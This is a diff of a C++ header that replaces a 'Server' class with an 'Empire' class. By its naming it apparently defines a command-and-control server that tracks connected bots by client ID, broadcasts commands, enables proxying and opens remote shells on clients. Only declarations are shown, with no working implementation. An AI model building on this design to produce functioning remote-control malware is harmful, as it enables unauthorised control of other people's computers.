@@ -1,55 +1,66 @@
 #include "../socket/server_socket.h"
+#include "../crypto/sha256.h"
 
-namespace ProxyNetShell {
-	const std::string getClients   = "get.clients";
-	const std::string getHistory   = "get.history";
-	const std::string getCID	   = "get.CID";
+#ifndef _WIN32
+#  include <sys/un.h>
+#endif // _WIN32
 
-	const std::string checkClients = "get.check";
-	
-	const std::string sendByCID    = "send.CID";
-	const std::string sendAll	   = "send.all";
+#include <sstream>
+#include <functional>
 
-	const std::string proxyEnable  = "proxy.enable";
+#include <map>
 
-	const std::string shell		   = "shell";
-	const std::string shellExit    = "shell.exit";
-}
-
-class Server {
+class Empire {
 private:
-	uint16_t		serverPort;
-	sys::ThreadMode threadMode;
-	sys::SocketType socketType;
+	typedef sys::ClientConnectionData       ClientCD_t;
+	typedef std::vector<ClientCD_t>           client_t;
+	typedef std::stringstream		       __sstream_t;
+	typedef std::string 				      string_t;
+	typedef std::vector<string_t> 	   	     vstring_t;
+	typedef sys::SocketServer		     	  server_t;
+	typedef std::function<bool(server_t*)>   handler_t;
+	typedef std::map<char, handler_t> client_handler_t;
+	typedef void 							    void_t;
 
-	std::vector<std::string> CIDHistory;
-	std::vector<sys::ClientConnectionData> clientsHistory;
-	std::vector<bool> isOnlineHistory;
+private:
+	handler_t SocketListenHandler;
+	server_t   SocketServerEmpire;
+	client_t     SocketClientData;
+	client_handler_t CHandlerList;
 
-	sys::SocketServer  server;
+	vstring_t  CID;
+	vstring_t  CDB;
+	vstring_t CHDB;
+	client_t CHDBC;
+
+	string_t ServerEmpire;
+	string_t CommandDeskList;
+	uint16_t port;
 
 public:
-	Server();
-	Server(const uint16_t);
+	Empire();
+	Empire(server_t&, handler_t&);
+	Empire(server_t&, handler_t&, const string_t&);
+	
+	[[nodiscard]] const uint16_t GetServerPort();
+	[[nodiscard]] const uint32_t GetServerAddress();
+	[[nodiscard]] const uint32_t GetClientAddress(const string_t); // arg it is CID
+	[[nodiscard]] const string_t GetCDL();
 
-	void setPort(const uint16_t);
+	string_t Addr2String(const uint32_t);
+	string_t GetServerResult();
 
-	void setThreadMode(const sys::ThreadMode&);
-	void setSocketType(const sys::SocketType&);
+	void_t   SetServerPort(const uint16_t);
+	void_t   SetHandler(handler_t&);
+	void_t   SetServer(server_t&);
+	void_t   SetCDL(const string_t&);
+	void_t   SetCHandlerList(client_handler_t&);
+	string_t ServerHandler(const string_t&);
 
-	[[nodiscard]] uint16_t getPort() const { return this->serverPort; }
-	[[nodiscard]] std::vector<std::string> getCIDList() { return server.getCID(); }
-	[[nodiscard]] std::vector<sys::ClientConnectionData> getClientList() { return server.getClients(); }
-	[[nodiscard]] std::vector<std::string> getCIDHistory() { return this->CIDHistory; }
-	[[nodiscard]] std::vector<sys::ClientConnectionData> getClientHistory() { return this->clientsHistory; }
-	[[nodiscard]] uint32_t getChecked() { return server.checkBot(); }
-	[[nodiscard]] uint32_t getLength() { return this->clientsHistory.size(); }
+	~Empire();
+};
 
-	bool sendAll(const std::string&);
-	bool sendByCID(const uint32_t, const std::string&);
-	bool shell(const uint32_t);
-
-	bool serverHandlerEnable();
-
-	bool runServer();
+class EmpireDaemon {
+private:
+public:
 };
